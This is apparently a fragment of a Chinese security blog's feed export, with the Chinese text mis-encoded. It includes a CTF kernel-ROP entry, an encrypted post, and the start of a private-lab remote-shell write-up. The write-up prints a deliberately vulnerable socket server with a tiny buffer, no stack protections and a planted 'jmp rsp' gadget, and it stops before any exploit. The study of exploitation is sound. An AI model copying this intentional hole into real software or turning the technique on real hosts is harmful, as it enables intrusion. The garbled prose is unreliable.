href="https://x3h1n.github.io/2019/07/04/2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core/">2018å¼ºç½‘æ¯ core | X3h1n</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel-ROP </tag>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºpopalæŒ‡ä»¤çš„ä¸€é“pwn</title>
      <link href="/posts/8179f351.html"/>
      <url>/posts/8179f351.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ff3adee71b85943723c899262a19fd36058cc1c39010569820ec50dfce7c37f7">0e96a196e04ab582d32680aaeaf05fdc0ff4581cd2e016adf497a33e0f0f5a405d915f1c487decf1b6fba2119b16df0d59108d3e9eb2945b2c0081761412eaea7fbdfbedf9e83ce93341376d4aad854aa0c0280e8fe9d0f964595a297dbbe7f77de4630cb58d7daf7a5742904f9f97117b8b030340a5ad7bc62180226c93e6608d384c904d83797a9945ea2eecd236e0d764b0e5d945811dd1da9b9851b7a1ce63403909280629275979bdabd89ac777ad16ebabe73fe7db2127af52255d1e8b1049cc3aa0fd8ad8c9394ec2d53b55d07bea41ddf47604c80e14f6e7d249b554127a3e3083c68366e40050b7571cc40e9a301b3f3ac79c87881b4e1aa79d3712415cf5b3682e1d73222ed7884e744a8d79444846e4f9c9cb680eb4aec16e96820cb39cb955c9738cbef0e6565a5f0142bac1d37093d3b8ff101d13a99fe8739d3434782f8ae1342a2c35aaba4e158503a5337a5433064dcbe2d111c040d4d936cd24b98c834885937cdbf5b7b6cba9092db336ae467e21e8b8d8a954d4aa804b86f41ee490d2c14793efae105a228d1c037e1ce1d4084e3adf01aeb83d84e053031ceca79247dcbedf51921035670ff22db95038b1c89f4654e6eed166b5446b7eb26405d437e288e5f7503462d95f604fb195e60e87cdbb403759cda02ba2a4add51fb82a469ae9ec5453fa5caae23a4e0bd5082f59c9b2def5ac8db791fbae740433e5210d4f0d76d3d852fb38f02212b7231d15c36a14f09b96c172ea838cca82b2258bd44f38b9a5d3d9ae9fe7cf76c8816466dd3efb476bf21159c733a147379ddad5b1099cf2136011b8a2bb7b98e0057135cfb3354ffe493e30937f0b7b59d6883685892b10adba184e6ed27b94e6a69ba514a24df97b3f3d68f9d6f0dfc72a5a594db0206de9d724bc82bb11335d84251a8cf0311948ba465cd2719651286f4eee058ef56c383ee925e8da03817bd2e3cdd2a32d4bae2cfbbde5245c0fb8150ae4d6f6479fa027c406b67e5891529a4b329bc617790e8505696a0fa2726be20f4dbc3547d71664e2aace5874c4d604de561109a00d036ba6e949b67dba541b52209d2d078a9579d387a36acd4a8ce8b9c7bbcf35ff054ec751269bcdd55eda6f93eb36a62acba4e84ec11fc8f93d5abefd423aa3384e72a40730510b2d6af49601fe3c9f413852f2cadec2e198cc7408c58bddae15b863f42365c66903ed940ea396ebb26cd16cf49c9318aab9b252f2aabb264574af0a75f1e3b56e70a9fb513b1891fa83a6d3e09bcfa20a4ed789b7553e4363a00936640567155068924c36e370a13cb3f0ef78a5c8ddb97447c842e62ced7594b860206bb2de618d117b93b32a5bdcd82049b24bbfb4c493163b2840eb2a80670684c58a9090676a0ec6ad348bb54d037d0602fd61c1fe31cd79054363ecb63e010d75b13d1e609e0523b77945fb40029a85bb35d63955f3af522c9c95524dacf7681c61747668c85617a5b4059413c4a1ab035bd7f0625566c46369494738ae8af3975596b36c579c01dca332a63a0ee96a13d8e309174b2178cd42c067fda90ffe2ba35739712ef6d7242ecb8e8e1e0db5d869108e2d23ba9e41b1105a1760baa60582cd2e9b4b02a37cbcb14dc70afd00755d1e35b81d99f1beb3ba0ba4884737db5405ab64fc8fd8882047d2a86d9b7608070e1956f8adba7a6d89987d44803fda84caf45f94554a52ece740c5d67841acee8532c772a761a47f42e0a777cea3d23823d2bc6a71ba0b5032709b5be9c1c4dc720a7dd2f424b1967890e2c6d6670aba0eca93ae3302c6d20b47995c1119cc2077d2fa05eeae799d3920c78650e0682559911facd79dacf18e902f210870aa6714aac97cfadf6249a8ddfb84c37cc7619cc3e52cc5e7eb2a6a6973ffef4d6f3596d75ee8a374e37e2269365b9d61a860454335ec6ad8c642bf145f753a82e1dc94843947e347f60001a434d2640297de7fe631c3f7d3a6a5a532654a25eb36d261dfa83e52f6c532d12fc2f409f6c546cadb43542c92ebaa6e3f23304192a28ea75348f7ccb10634edd2460a67c99514a0886fcf648b026479f2e81c9ee78de8e522866264d4ce40a1c74d8106a3cafaa93865c16e5de36115db642d974039dd85eeb035a4695ed234b76a5f39bdaeeb28cc5d6334422a70e963a72504d1858a4cc5e2209b8db77a222bd13348e6130e673d8c40c89c39315322e4f7a74e94c4345fa269c0773ad69804a935e5ea6b5b713ec635d1626340f89af238aa82a0955ebcfab0faf840143eb1c438b21402e6f9cb22e2ae4af2580d11f9d7dcd74684003b16fe9480df31de2daebc2182807fef9c0a8675acec61760c31bb197bcb58f2d77b7e02dbe02bc5121a9b4e2ce2aed120ef7ccaadeb0caa3022d13bf6e61bab121a5724ccffde582cd00ee751afd79f38d70bf4648d0567d5f83c6ff080b6b1b641f4f9feb599131e5d664ec414e911e4436b7ca088af751161113349558e36cc1476aa229afa52548c124f197f4e55642a472476bb0fab833f3bcf0eaeb5eca99d4e316fa33e7ce3f61d6883c198fc1ef77212e2adadf9522cd6ae6dde21ad5431e479c57f79531f032d0a82fe19514de105ed6fc2ea1602807371f25f58e447f1dfa7d727a6a3a7ed8183dfbb55f6ee7e5d335873795367ca2f1c4d3f2f3f0d366915a36ac75220ce84abd753db2b72db929ea28d1b5bd1355feb94aef559a605d922cb4d0da397b3519d1f16af7d23bb67d316efc751cb1f47dbc4e3ac6b24cae2ca64ef435dc1a5790cc6104d3cd97f9ac11fcec20780773162a42ff94b6e1d6ea1373c50c9bd9f2115dd5031c81e1c2b8ebe78402d0687c44ba2aaff1da0433ea22668f410a5df8f3290202f7cc915f1ee40711edcd5b84e3efcd95434257f3baa59cce5aec52df994773e759b40eda56fa1d30fb5a71d3afb8690f603d1f54ccf094dd53d171b5011514c9a383cade343cb97c10c838f8786450ce1054fb0a9bed6afa49a45530b753b8c2a148fc810bf504a5a88db53f0237ea07132605ff6813b53f2f3904191d69cc40b3da0c77e28a22c3f07ff8122e6dee0a823a0066df3fa769a00c2624424f46b91d187c25b5b31cb41bcdd3b07a69e0756773153734924bbfe36bb7b1201639750115b57e3573eb3f2a9748e0f1b60abaa562c48f3c73b5d7a3ba15a9a61b724e8783f9f6f157d816fe9ca59c5168d4db04314b00677b0f0bb811e9a089bc52c1b84cbd4d2c2f26f590161471e720dccb6fd14dad00e98019884d5a2ab05e9442d29dbf4e47d9af5c055a74b4109f4114191ef8d720e877a7a7109f817debeeee5ee2c4541e27bf84779db44f79ac181de42b56c1696a475019c34ad65d65b5778383f595f114a0d9d76cdb8575f09c668be760816637b90533bbe62db5e86749f54deaa43e2345c26f1b92f16665164bf59befbafc190ddfecb03bb99a204437c95e134fa7a9fb77c2e96ac9e7c136a91a3b874554728c17cc30421699477d07c03b2f599be30a56c45c590bc9ea5b356b62192e4c647639e368ab3e58c58b52185c2eaab57d37030c327ca3489f0609fe060b34ae9f25852736e83ffe12eb5772900375abfccbd3cd0af9501481e3c0c4053063558630cf4b6b91d8384bc7f9683c59333b52d714c0c9557f3d43c5be3910ae4aaecbf2ef9f514ad141d627b8bc6e1e310c68f3a7e40618214c4bc09d0229eef85d836bb2938488ef7ae8ecdd53cf5a7ba9ac6cf1b812fcf28aa0a4a15f449fb3f46d1734ffb0184e12217cfd9ec010d54fa056bf3ef1d4335d1586b81d2c1e74dfa7022fe08e6a2d29ad58353a09b23d0307860b79af629cf1478e7553ad339e00475c0f33140d0a187a8b141697e5fc0a825c5df5d4e12753dbd0016d6b17e62a8660e8424e896bad2feda53d4114010dcfaf3922627909504d0a26c69df45a5959687a7326fa755d0c5480fcf7f4caf6ff9dc0b11e701bec0410222046669245836947995c2c20eb79551035d2a328be15375b65fc514b6ac7eda49bbe8363a1bfa8c341c629db13955fd8a791d236e2c0d4351fa847455dd5d069ac8713b7feb57ad9643f7911ee977c3dec8d46c56cc66fcd7917670c987f06dd342301c736899d6f01b60421ed1dfcc19c034a6fddf118f0d59ca629f50c52fe5ca5982c21c6bd8486803dcbb76ae34798b9663046a6beca50aa201b3a80d4f6f8328d510ba110dd61802ae0631ce7fdf2a8faadde61430e0e1be7272aef0f3d03409694002d93aec39e226e89728fdf14adc1e19b8473eadcd8a2d836e5e8c8832865e8cd751d604d9a54e011d9b4001cc09d7b117ab78e0f7796247f003b558281cf376ba59e7d4956b15c7c852237ff03ba79c87f3b73818b7868adfd2591b10995b0a3b090e895285bf1cd426e1554bc35f304d8b0509c42d85eed15332384728e6642d0cf99566a3c5a322923ace7b8f99dd8021cfde2783d29c29220f6bba625ca37a629f6d7a6e3954a52fabcd67c18f2dea8b049e9b91cb2e24de566e97dde87e9943ca7dea26b2d6b56bb19bd53fe30a68492e257117b64cff986b7ffaaba656af4dac2cafd01803bdb9984e5ba516ccbdfc956d209689828d1073cde46b2cefd5e107cf9221438a5ab620cef84d0726ea4a3a2769899da49186ca3c1a37de57016ac1da5fd61884f67af3ef202df5de4af1b940cfb039554928b58478ef87e0d13ed4c31c05d174ba6a09339a737c507aa12f90f8503b18448f52f45d431e4ac7c15186b4c21bf8993ec7fa12e28ce5176bdb26a3fdbd7117f85887daeb10550cc518ebdfe3d38a63be876de6475b8c50809f39ef658f25bf055f2a1e5cae1cc6454c75a104369cadaec9b8e618d60d8eae9d93e4be36eedb925b0db8a5c99b6a31048c33407a927af88de7e5f66459aa47ec5ac1308d1067937a9c8849f57fd4eeddd56152c42b8230c88ab3c0cacbea598def5749528064ab0a6e1c8677aa0d86921bc029b941e9463d2652fb6754929e800e2e00128ff3470f6eed671395244bf78052f8b7381be55d46fac8eda4ad68fb9e55c37afbdb0be827bd8ac65465fcc389926be61154b4a01838879b15cc61fa8c41ccc764eaa9a2374a89aaaea92740cf3a63a5d234603b16b62c23c01d78282f1e5d1e6dec1aa76c5b7678acd3f5cc4903c093bac7f06c7eab9a06b028f250e600f7e02cf251613cd7bf27b24652c11fa226f0346fbf0786048b416b557c35e6c90d66ac592bc3ab6e5956a72913c05ccf7350c85586c6cc5b0e3b5b677bf9c1ad6e2e702afd784dd9c411f1f8947626b7e219bfc62e2796e2b4c2ff0bf05614fe6cf21ec204d08e9026a80a34b587c52b9eb41bbf8da2f01307b5df81a13abcf684eedfcdbc42fa6e113abb7c9abdff9eba8b8644963fe7f19de648cd51ca672a21cfc36c399316029ec3e4ea67dbb7896e3475d238a7ca0521a4fd8d2c5b9d75d00c1dbf24b045583807019c39afe3110a77bdad428d199a07b278647b6080383c3d56de24310594d9261ac62f2d9e5568d724f5db1cc8d2507c31019f79b8a4abe29cadb9d955cf82344e6c13389ab49f93771c7f0645cc93d1b7e3e33a17e49bb2ddc50246c909868d126a4cf506e6ae8fcde77434c63e7e807b3fc97f71570256195b2bbbfe936b7e2d79b3e3ec59287f4044311eaa0b0f36478843551b902c982b3508d3a504e0a283eb2903464daaf28d4d3ba915c1beca12b3fd48e33f3e6ec91786260b8ee94f11c4de9e91ea5355605fbd938e983c55563c22f9bab24f67cbec51a69e57678561f02fcedef540ca25449d892e2eaddae1bf05470fc1bedd1244fac47999729d88cb3bafb690bc81b2b64f2ac5c3b6c53bfad783a2792b4f221ab55660d057e9b790622cf757d78ddc64969b7096b8a8adefc0e62793c59fbafc4833fbb6576ef2f05649e142ec6be0dfda42caa9c225e53d244ccb55ca9caae305cd511e2310f681befbbdc5cb7c717a02616cf4bbf14f10c25f9aed7314fd6eaf796f05ff2d6c91a20f9f05abfaa26e98ff4280fa149a0aa3c32ee06157fd0d4b678258f2d6b99326aa87a1d7d7f88dad1ad6af28f9541846d469eb19599fc038b14627d5eb552039abffe7b9300d7fc189e13c61eb209d7c7b05a60f7efed4bc0bf83bfc6219eed061696fa2a249e0f2216fa1521d1e30f05b1e2fe60b7128804df234246c5833cc4d1ef96a3437cec788f99c63f19928e7bbe8a90e1c43e061572b3d6dd64c130c46d3ca6ede796274644dfd2171efcb5a97d00a44280c1f57c7138baf3145b405b3ba63b763f9965c55da35e019b702ce1c6c077a5dda22a674ecb1140ceb8d17a17001e3c5db359ac2b614dd4153c3052456ab7878e706949e4c1e41d96a20882adab036ee9957909bb5987408e1a76993c2ce892091a45b5ec6233d7c04e1cdd89e3a656320b3246877a19971bc353fd1d424ed236457cb1654417e7ccbb41b8c6fff19d051b750a61f1f65d7265255f2ffd921737edce6d558627e904e7e7d30effa6fe27f4c1234fa98b53dde39122e087d8a4f210d42d2493ab445d05906a696097fecc214c797aa72be1ac6c270a8a00685e8de646ca3c32e9ba4b6b79a827bbfe61eb4ea1d30851359670f87d12d9f6b6af7024acd269a35098c3cf30d0e9323d0e917b4af7a3110eecabbf043c821a9bd6d1d6af359a38a764f31b45a57a3794f3456f984e819f2bec85d705ae24e21cc090738b150ceee16c4b8b1b93edfcf489b616b745481603332e36e37289f636b2d45364ac7077002fe1f77b507c42bdac4cf0108cab96d9d49871ea7ca244d85b344a47d5eba9ae9898bbb64b0d750b79ab348f75529779d20638bb02cf10531ee08fa29dc19ae269db539b5626e12493482112d1d4c0b1e4f313f2998a64f7735c6d885f32ff7bb13406736cf17c2d1cbf77373575eb947bbaf1bc1929893fa9c754a7e8e9469d15d89b8f4660852f2f9a59d2fd3ebcca67e10af15e2c861d9b78ef3bc44298f1e16b1484fcb69cbd502cbf8d00953d0d3f24ff51e082112e1973f61f2f0af977ab9e59807b1ab5fc030d44985eb516eff09b9d03ebff566e0389e06f977244b244720c5f5749b04a81c6b039bb546a3408ca8f3ea3d6c36921bd2c28429799b94c699d77d9945b9820c1cf5315a7b45d2af03dc0a6cfa024e6dfac2aec025bab252a8080bd0ffb6e425cfad01fd3e67d187ee8414c8a887d611996e92e458992d46abaf6268cdc37f428be6124b1ac3b46b6b810f8241185f885402c6b47fcf95f96198b1f70fb9cd9014a3aed2360a84a0f521bc504034ac33927f95788ba8b2e56b2c25e344f28ea51b0bbe08d2fa98ff13402384788c5b563d6290e312a860322e658be9391de58669070b7252dbf94b5f78d3c4e047b7f5f1deebc1cc6c7bd8c44359944231259519d70e53e329434dbdaf1991bfbfef63bbbfc7f424f70237728107c3a4571e2e6fda94072ee3a555269b89d7a2017b2a933eeb57288e53815d02aabaffc0a1b5900a2f93f998a8d4083cc9e3d33a39f150e9b86b63ce710458fca245ec9582c655b9f37811c664747b236902ed6cb9d006200c40dedadb302d8c97d1ea7a5133bf682fd3ff18057123604c701aac1ac4475ed476c24839d5397414eaf57937cb8cbfde119aaab96649c4f011beb9ea78e12049388fea646bd2dbc213ace06d571ba6da097d6dfa6cf7c603ebc41dc7557c066bdc8915afcc78376f51158f7646a6b94fdeb771d04f09b83b3e63946463ecb253ab0f2b673e3d45ba597571506a1bc9fbaab035ae8377995972583096db493c5fc51689c32bfc4a26769d858af2e27584ab8fb605f56be8a0b2ebea0242473b32fb89b288c97fe610b08e668db678940451c5718bea5211d769b112a892dab82839eeeb56f775d6c04367cd58c99454548a455693ce60c117cda92ae15af2b0a6bdface1911</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> ç§æˆ¿èœ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lab </tag>
            
            <tag> popalæŒ‡ä»¤ </tag>
            
            <tag> trick </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€æ¬¡ç®€å•çš„è¿œç¨‹Getshellï¼ˆåœ¨ç›®æ ‡æœºä¸Šå¼€å¯ä¸€ä¸ªshellï¼‰</title>
      <link href="/posts/729cf436.html"/>
      <url>/posts/729cf436.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç–‘æƒ‘"><a href="#ç–‘æƒ‘" class="headerlink" title="ç–‘æƒ‘"></a>ç–‘æƒ‘</h2><p>ä»ç¬¬ä¸€æ¬¡æ¥è§¦pwnçš„åˆ°ç°åœ¨å°†è¿‘å››ä¸ªæœˆäº†ï¼Œæ¯æ¬¡åšå‡ºæ¥pwné¢˜ä¹‹åï¼ŒæŠŠå†™å¥½çš„è„šæœ¬æ‰“åˆ°æœåŠ¡å™¨ä¸Šï¼Œå°±å¯ä»¥åœ¨æœåŠ¡å™¨é‚£è¾¹å¼€å¯ä¸€ä¸ªshellï¼Œç„¶åç”¨catå°±å¯ä»¥è¯»å‡ºæˆ‘ä»¬éœ€è¦çš„flagäº†ã€‚å¯æ˜¯äº‹å®ä¸Šæˆ‘ä»¬çœŸçš„å¯ä»¥ç”¨pwnçš„è§£é¢˜æ‰‹æ³•å»è¿›è¡Œä¸€æ¬¡æ”»å‡»ä¹ˆï¼Ÿæˆ‘ä»¬æœ€ååœ¨å¯¹æ–¹ä¸»æœºå»æ‰§è¡Œsystem(â€˜&#x2F;bin&#x2F;shâ€™)çœŸçš„å¯ä»¥æ‹¿åˆ°shellä¹ˆï¼Ÿ</p><h2 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h2><p>æ¥ä¸‹æ¥çš„å®éªŒç¯å¢ƒï¼š</p><p>æ”»å‡»è€…çš„æœºå™¨æ˜¯Ubuntu   ip:192.168.43.150</p><p>ç›®æ ‡æœºæ˜¯kali      ip:192.168.43.71</p><h2 id="å¯¹ç–‘æƒ‘åšä¸€ä¸ªç®€å•çš„å›ç­”"><a href="#å¯¹ç–‘æƒ‘åšä¸€ä¸ªç®€å•çš„å›ç­”" class="headerlink" title="å¯¹ç–‘æƒ‘åšä¸€ä¸ªç®€å•çš„å›ç­”"></a>å¯¹ç–‘æƒ‘åšä¸€ä¸ªç®€å•çš„å›ç­”</h2><h3 id="å…ˆå›ç­”ç¬¬ä¸€ä¸ªé—®é¢˜ï¼ˆæˆ‘ä»¬çœŸçš„å¯ä»¥ç”¨pwnçš„è§£é¢˜æ‰‹æ³•å»è¿›è¡Œä¸€æ¬¡æ”»å‡»ä¹ˆï¼Ÿï¼‰ã€‚"><a href="#å…ˆå›ç­”ç¬¬ä¸€ä¸ªé—®é¢˜ï¼ˆæˆ‘ä»¬çœŸçš„å¯ä»¥ç”¨pwnçš„è§£é¢˜æ‰‹æ³•å»è¿›è¡Œä¸€æ¬¡æ”»å‡»ä¹ˆï¼Ÿï¼‰ã€‚" class="headerlink" title="å…ˆå›ç­”ç¬¬ä¸€ä¸ªé—®é¢˜ï¼ˆæˆ‘ä»¬çœŸçš„å¯ä»¥ç”¨pwnçš„è§£é¢˜æ‰‹æ³•å»è¿›è¡Œä¸€æ¬¡æ”»å‡»ä¹ˆï¼Ÿï¼‰ã€‚"></a>å…ˆå›ç­”ç¬¬ä¸€ä¸ªé—®é¢˜ï¼ˆæˆ‘ä»¬çœŸçš„å¯ä»¥ç”¨pwnçš„è§£é¢˜æ‰‹æ³•å»è¿›è¡Œä¸€æ¬¡æ”»å‡»ä¹ˆï¼Ÿï¼‰ã€‚</h3><p>å¯ä»¥çš„ï¼Œå› ä¸ºæ¥ä¸‹æ¥ï¼Œæˆ‘å°±æ¼”ç¤ºä¸€ä¸‹åˆ©ç”¨ä¸è§£pwnç›¸åŒçš„æ€è·¯å®Œæˆä¸€æ¬¡æœ€æœ€æœ€ç®€å•å…¥ä¾µï¼ˆç”šè‡³ç®€å•åˆ°è¿˜éœ€è¦ç›®æ ‡æœºçš„é…åˆï¼‰ï¼Œå°±æ˜¯åœ¨ç›®æ ‡æœºä¸Šè¿è¡Œä¸€ä¸ªæœ‰æ¼æ´çš„ç¨‹åºï¼Œç„¶åæ”»å‡»è€…å‘é€ç»™ç›®æ ‡æœºä¸€ä¸ªè„šæœ¬ï¼Œç„¶ååœ¨æ”»å‡»è€…çš„ä¸»æœºä¸Šå¼€å¯ä¸€ä¸ªshellï¼Œç”¨æ¥æ§åˆ¶ç›®æ ‡æœº</p><h3 id="å†å›ç­”ç¬¬äºŒä¸ªé—®é¢˜ï¼ˆæˆ‘ä»¬æœ€ååœ¨å¯¹æ–¹ä¸»æœºå»æ‰§è¡Œsystem-â€˜-x2F-bin-x2F-shâ€™-çœŸçš„å¯ä»¥æ‹¿åˆ°shellä¹ˆï¼Ÿï¼‰ã€‚"><a href="#å†å›ç­”ç¬¬äºŒä¸ªé—®é¢˜ï¼ˆæˆ‘ä»¬æœ€ååœ¨å¯¹æ–¹ä¸»æœºå»æ‰§è¡Œsystem-â€˜-x2F-bin-x2F-shâ€™-çœŸçš„å¯ä»¥æ‹¿åˆ°shellä¹ˆï¼Ÿï¼‰ã€‚" class="headerlink" title="å†å›ç­”ç¬¬äºŒä¸ªé—®é¢˜ï¼ˆæˆ‘ä»¬æœ€ååœ¨å¯¹æ–¹ä¸»æœºå»æ‰§è¡Œsystem(â€˜&#x2F;bin&#x2F;shâ€™)çœŸçš„å¯ä»¥æ‹¿åˆ°shellä¹ˆï¼Ÿï¼‰ã€‚"></a>å†å›ç­”ç¬¬äºŒä¸ªé—®é¢˜ï¼ˆæˆ‘ä»¬æœ€ååœ¨å¯¹æ–¹ä¸»æœºå»æ‰§è¡Œsystem(â€˜&#x2F;bin&#x2F;shâ€™)çœŸçš„å¯ä»¥æ‹¿åˆ°shellä¹ˆï¼Ÿï¼‰ã€‚</h3><p>ä¸å¯ä»¥çš„ï¼Œå¦‚æœä»…ä»…æ˜¯å¹³å¸¸æˆ‘ä»¬åšé¢˜çš„è„šæœ¬ï¼Œå‘åˆ°äº†è¿è¡Œç€æ¼æ´ç¨‹åºçš„ç›®æ ‡æœºä¸Šï¼Œæ‰§è¡Œäº†system(â€˜&#x2F;bin&#x2F;shâ€™)ï¼Œä»…ä»…æ˜¯åœ¨ç›®æ ‡æœºä¸Šå¼€äº†ä¸€ä¸ªshellï¼Œè¿™ä¸ªshellä¸æ”»å‡»è€…çš„ä¸»æœºæ˜¯æ²¡æœ‰ä»»ä½•å…³ç³»çš„ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/2706180-20220311170438374-343305220.png"></p><p>å¯ä»¥çœ‹åˆ°kaliä¸Šç¡®å®å¼€å¯äº†ä¸€ä¸ªæ–°çš„shellï¼Œä½†æ˜¯è¿™ä¸ªshellè·Ÿæ”»å‡»è€…æ˜¯æ²¡å…³ç³»çš„ï¼Œå¯ä»¥çœ‹ä¸‹ubuntuè¿™è¾¹çš„æƒ…å†µï¼ˆå‘ç°æ˜¯æ²¡æœ‰ä»»ä½•å›æ˜¾çš„ï¼‰ã€‚</p><p><img src="/../img/2706180-20220311170452032-529076340.png"></p><h2 id="è¿›æ”»çš„æ€è·¯ä»¥åŠå‡†å¤‡"><a href="#è¿›æ”»çš„æ€è·¯ä»¥åŠå‡†å¤‡" class="headerlink" title="è¿›æ”»çš„æ€è·¯ä»¥åŠå‡†å¤‡"></a>è¿›æ”»çš„æ€è·¯ä»¥åŠå‡†å¤‡</h2><h3 id="é¦–å…ˆç¬¬ä¸€ç‚¹ï¼Œå°±æ˜¯æ€ä¹ˆæ‰¾åˆ°ç›®æ ‡æœºï¼Ÿ"><a href="#é¦–å…ˆç¬¬ä¸€ç‚¹ï¼Œå°±æ˜¯æ€ä¹ˆæ‰¾åˆ°ç›®æ ‡æœºï¼Ÿ" class="headerlink" title="é¦–å…ˆç¬¬ä¸€ç‚¹ï¼Œå°±æ˜¯æ€ä¹ˆæ‰¾åˆ°ç›®æ ‡æœºï¼Ÿ"></a>é¦–å…ˆç¬¬ä¸€ç‚¹ï¼Œå°±æ˜¯æ€ä¹ˆæ‰¾åˆ°ç›®æ ‡æœºï¼Ÿ</h3><p>å¯¹æ–¹ä¹Ÿä»…ä»…æ˜¯ä¸ªä¸»æœºï¼Œå®ƒå¹¶ä¸ä¼šåƒæœåŠ¡å™¨é‚£æ ·æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œè€Œæ”»å‡»è€…çš„ä¸»æœºå’Œç›®æ ‡æœºå°±å¦‚åŒé»‘æš—æ£®æ—ä¸­å¸¦æªçš„çŒäººï¼Œæ— æ³•ç›´æ¥è¢«æ‰¾åˆ°ï¼Œè€Œæƒ³è¦æ‰¾åˆ°å®ƒï¼Œå°±éœ€è¦ä¸æ–­çš„å»æ¥è¿‘å®ƒï¼Œæœ€ç»ˆçŒäººä»¬å½¼æ­¤å¤„äºäº†åŒä¸€ç‰‡æ£®æ—ï¼ˆä¹Ÿå°±æ˜¯æ”»å‡»è€…ä¸ç›®æ ‡æœºå¤„äºäº†åŒä¸€ä¸ªç½‘æ®µï¼‰ã€‚æ­¤æ—¶çŒäººè¯•ç€ç”¨nmapå·¥å…·æ‰«æäº†ä¸€ä¸‹ï¼Œç„¶åå°±å‘ç°äº†å¦ä¸€ä¸ªçŒäººçš„ipï¼ˆè¿™ä¸ª192.168.43.1æ˜¯ç½‘å…³ï¼ˆgateway)ï¼‰ã€‚</p><p><img src="/../img/2706180-20220311170506140-1776303059.png"></p><p>çŒäººæŠ±ç€è¯•è¯•çœ‹çš„å¿ƒæ€ï¼Œå»æ‰«æäº†ä¸€ä¸‹è¿™ä¸ªipã€‚</p><p><img src="/../img/2706180-20220311170524403-609189311.png"></p><p>å‘ç°äº†å¼€æ”¾8888è¿™ä¸ªç«¯å£ï¼Œè€Œè¿™ä¸ªç«¯å£è¿è¡Œäº†ä¸€ä¸ªæ— NXæ— canaryä¸”æœ‰æº¢å‡ºçš„ç¨‹åºï¼ˆè‡³äºçŒäººæ€ä¹ˆçŸ¥é“è¿è¡Œçš„æ˜¯è¿™ä¸ªæ¼æ´ç¨‹åºï¼Œè¿™é‡Œä¸åšè®¨è®ºï¼Œæ¯•ç«Ÿè¿™ç¯‡æ–‡ç« çš„ç›®çš„æ˜¯æ¼”ç¤ºä¸‹æœ€ç®€å•çš„è¿›æ”»æµç¨‹ï¼Œè€Œå®é™…çš„ç¯å¢ƒä¸­è¦æ¯”è¿™ä¸ªæµç¨‹å¤æ‚å¾ˆå¤šï¼‰ã€‚</p><p>æ¼æ´ç¨‹åºçš„æºç å¦‚ä¸‹ï¼ˆè¿™é‡Œæˆ‘ç”¨çš„æ˜¯è¿™ä½å¸ˆå‚…çš„æºç <a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/%EF%BC%89%EF%BC%9A">https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/ï¼‰ï¼š</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span>  s,c,j  =  <span class="number">0xe4ff</span>;<span class="comment">//ç•™ä¸‹çš„è¿™ä¸ª0xe4ffå¯¹åº”çš„å°ç«¯åºæœºå™¨ç å°±æ˜¯jmp rsp,è¿™æ ·æº¢å‡ºåˆ°è¿”å›åœ°å€ç›´æ¥å¡«å†™è¿™ä¸ªåœ°å€ï¼Œå°±å¯ä»¥æ‰§è¡Œä¸‹é¢çš„shellcodeäº†ï¼ˆå°±ä¸éœ€è¦å†æ³„éœ²åœ°å€äº†ï¼‰</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span> </span><br><span class="line">  server.sin_family      = AF_INET;<span class="comment">//ä½¿ç”¨IPv4åœ°å€</span></span><br><span class="line">  server.sin_addr.s_addr = INADDR_ANY;<span class="comment">//INADDR_ANYä¸ºæœ¬æœºçš„IP</span></span><br><span class="line">  server.sin_port        = htons(<span class="number">8888</span>);<span class="comment">//å¼€æ”¾çš„ç«¯å£</span></span><br><span class="line"></span><br><span class="line">  s = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);<span class="comment">//ç¬¬ä¸€ä¸ªå‚æ•°è¡¨ç¤ºä½¿ç”¨IPv4åœ°å€ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¡¨ç¤ºå¥—æ¥å­—ç±»å‹ä¸ºé¢å‘è¿æ¥çš„å¥—æ¥å­—ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºä½¿ç”¨TCPä¼ è¾“åè®®</span></span><br><span class="line">      bind  (s,(<span class="keyword">struct</span> sockaddr *)&amp;server,<span class="keyword">sizeof</span>(server));</span><br><span class="line">      listen(s,<span class="number">10</span>);</span><br><span class="line">  c = accept(s,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">      read  